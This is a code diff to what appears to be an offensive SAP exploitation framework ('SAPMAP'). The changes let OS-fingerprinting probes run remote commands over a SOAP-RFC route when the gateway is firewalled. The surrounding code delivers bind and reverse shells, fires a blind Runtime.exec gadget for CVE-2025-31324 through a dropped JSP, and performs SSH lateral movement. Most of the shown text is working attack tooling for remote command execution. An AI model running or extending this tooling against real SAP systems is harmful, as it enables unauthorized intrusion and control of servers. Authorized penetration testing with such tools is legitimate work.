@@ -1263,12 +1263,19 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     }
 
 
-def _detect_is_windows(node, method: str = "sxpg") -> bool:
+def _detect_is_windows(node, method: str = "sxpg",
+                       soap_route: dict = None) -> bool:
     """Probe the target to determine whether it is Windows when os_type is unknown.
 
-    Runs ``cmd.exe /C echo __SAPMAP_WIN__`` via SXPG or GW.  If cmd.exe
-    succeeds and echoes the token back, the target is Windows.  Result is
-    cached on ``node.os_type`` so subsequent calls skip the probe.
+    Runs ``cmd.exe /C echo __SAPMAP_WIN__`` via SXPG, GW, or SOAP-RFC.
+    If cmd.exe succeeds and echoes the token back, the target is
+    Windows.  Result is cached on ``node.os_type`` so subsequent calls
+    skip the probe.
+
+    When ``soap_route`` is supplied AND the gateway port is unreachable,
+    routes through SOAP-RFC SXPG instead of pyrfc — required for
+    HTTP-only Type-G/H targets where the dispatcher/gateway are
+    firewalled.
 
     Returns True if Windows, False otherwise.
     """
@@ -1280,7 +1287,8 @@ def _detect_is_windows(node, method: str = "sxpg") -> bool:
     try:
         if method == "gateway" and node.gw_vulnerable:
             r = sapmap_exploit.execute_os_command(
-                node, "cmd.exe", f"/C echo {probe_token}")
+                node, "cmd.exe", f"/C echo {probe_token}",
+                soap_route=soap_route)
         elif method == "cve_31324" and node.cve_2025_31324_vulnerable:
             # Route through the dropped JSP if available (output capture),
             # otherwise fire the blind Runtime.exec gadget — in the latter
@@ -1293,6 +1301,12 @@ def _detect_is_windows(node, method: str = "sxpg") -> bool:
                 # Blind exec — no output to match; assume Windows.
                 node.os_type = "Windows"
                 return True
+        elif soap_route:
+            # SOAP-RFC route trumps pyrfc — every other probe path
+            # would hang for 60s on the unreachable gateway port.
+            r = sapmap_exploit.execute_os_command(
+                node, "cmd.exe", f"/C echo {probe_token}",
+                soap_route=soap_route, prefer="soap_rfc")
         else:
             creds = node.best_credentials()
             if not creds:
@@ -1308,19 +1322,28 @@ def _detect_is_windows(node, method: str = "sxpg") -> bool:
     return False
 
 
-def _detect_python_cmd(node) -> str:
+def _detect_python_cmd(node, soap_route: dict = None) -> str:
     """Detect whether the target has python3 or python (2.x).
     Caches result on node._python_cmd.
+
+    When ``soap_route`` is supplied AND the gateway is unreachable, the
+    probe runs over SOAP-RFC SXPG — required for HTTP-only Type-G/H
+    targets where pyrfc would hang for 60s per attempted command.
     """
     cached = getattr(node, "_python_cmd", None)
     if cached:
         return cached
-    # Try python3 first via a quick GW or SXPG probe
+    # Try python3 first via a quick GW, SXPG, or SOAP-RFC probe
     for cmd in ("python3", "python"):
         try:
             if node.gw_vulnerable:
                 result = sapmap_exploit.execute_os_command(
-                    node, cmd, "--version")
+                    node, cmd, "--version", soap_route=soap_route)
+            elif soap_route:
+                # No gw / pyrfc creds usable — SOAP is the only way.
+                result = sapmap_exploit.execute_os_command(
+                    node, cmd, "--version",
+                    soap_route=soap_route, prefer="soap_rfc")
             else:
                 creds = node.best_credentials()
                 if creds:
@@ -9231,6 +9254,10 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 "success": bool(ssh_result.get("success")),
                 "output": ssh_result.get("output") or [],
                 "error": ssh_result.get("error") or "",
+                "channel": "ssh",
+                "channel_reason": (
+                    f"ssh from {acc['from_sid']} → "
+                    f"{acc['username']}@{acc['target']}"),
             }
         else:
             return json.dumps({"error": f"Unknown method: {method}"})
@@ -9284,6 +9311,13 @@ def create_app(api: SAPMAPApi) -> Bottle:
             target_host = node.ip or node.hostname
             # SSH targets: use the SSH target IP and skip OS detection
             # (SSH key-based lateral movement is Linux-only in practice)
+            # Phase 3b: discover any SOAP-RFC route to this node first,
+            # so the OS-detection probes can use it instead of pyrfc
+            # (which would hang for 60s per probe against firewalled
+            # Type-G/H targets — _detect_is_windows then
+            # _detect_python_cmd = 120s before delivery even starts).
+            soap_route_early = find_soap_rfc_route_for_node(
+                api.state, node)
             if method == "ssh":
                 ssh_acc = (getattr(node, "ssh_access", None) or [None])[0]
                 if ssh_acc:
@@ -9295,8 +9329,12 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 # (e.g. freshly-added nodes where the discovery scan hasn't run).
                 # _detect_is_windows caches the result in node.os_type so it
                 # only ever runs the probe once per node.
-                is_win = _detect_is_windows(node, method=method)
-                py_cmd = "python3" if is_win else _detect_python_cmd(node)
+                is_win = _detect_is_windows(
+                    node, method=method,
+                    soap_route=soap_route_early)
+                py_cmd = ("python3" if is_win
+                          else _detect_python_cmd(
+                              node, soap_route=soap_route_early))
             if shell_mode == "bind":
                 payload = _generate_bind_payload(
                     node.os_type, shell_port, python_cmd=py_cmd)
@@ -9321,12 +9359,10 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     if _shell_session:
                         _shell_session.progress_msg = msg
 
-            # Phase 3b: discover any SOAP-RFC route to this node so
-            # bind/reverse shells survive firewalled gateways.  The
-            # chunked-payload loop and the final exec both go through
-            # execute_os_command, which uses soap_route as fallback
-            # when the gateway port is unreachable.
-            soap_route = find_soap_rfc_route_for_node(api.state, node)
+            # Use the SOAP-RFC route resolved before the OS probes.
+            # Same route covers both the OS-detection probes above and
+            # the chunked-payload writes + final exec below.
+            soap_route = soap_route_early
 
             if method == "gateway":
                 # GW: EXTPROG = "command", PARAMS = "params", LONG_PARAMS = "long_params"
